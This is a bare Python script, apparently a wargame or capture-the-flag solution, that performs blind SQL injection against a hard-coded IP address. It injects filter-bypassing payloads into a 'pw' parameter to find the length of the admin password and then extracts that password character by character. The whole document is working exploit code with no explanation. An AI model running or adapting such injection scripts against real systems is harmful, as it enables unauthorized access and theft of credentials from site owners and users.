import requests

url="http://3.36.149.228:8081"

length=1
while True:
    query="?id=adadminmin&pw=%27%20||%20id%20like%27admin%27%20%26%26%20length(pw)%20like%20("+str(length)+")%23"
    result=requests.get(url+query)
    if("YOU GOT THE RESULTS!" in result.text):
        print("password length:", length)
        break
    print(length)
    length+=1

pw=""
for i in range(1, length+1):
    for ch in range(48, 123):
        if (58 <= ch <= 96): continue
        query="?id=adadminmin&pw=%27%20||%20id%20like%27admin%27%20%26%26%20mid(pw,"+str(i)+",1)%20like%20'"+chr(ch)+"'%23"
        result=requests.get(url+query)
        if("YOU GOT THE RESULTS!" in result.text):
            pw+=chr(ch)
            print(pw)
            break
print("password:",pw)
